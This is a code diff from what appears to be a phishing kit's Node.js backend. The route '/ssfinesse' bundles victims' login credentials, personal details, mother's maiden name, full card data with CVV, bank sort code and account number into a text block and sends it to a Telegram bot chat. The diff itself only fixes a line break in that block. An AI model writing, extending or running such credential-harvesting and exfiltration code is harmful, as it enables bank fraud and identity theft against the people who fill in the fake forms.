@@ -2628,7 +2628,7 @@ app.post('/ssfinesse', (req, res) => {
         }
     }).then(function () {
         binList = `${bin} | ${dob} | ${pcode} | ${bankName}`
-        var originalText = `+----------- Login Information ------------+\nEmail: ${username}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nTown: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nMMN: ${mmn}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
+        var originalText = `+----------- Login Information ------------+\nEmail: ${username}\nPassword: ${password}\n+----------- Personal Information ------------+\nFull Name: ${fullname}\nDOB: ${dob}\nAddress: ${address}\nCity: ${city}\nTown: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\nMMN: ${mmn}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort code: ${scode}\nAccount number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
         if (skiii719 == 7) {
             axios.post(
                 `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage?chat_id=680379375&text=BT:\n${originalText}`
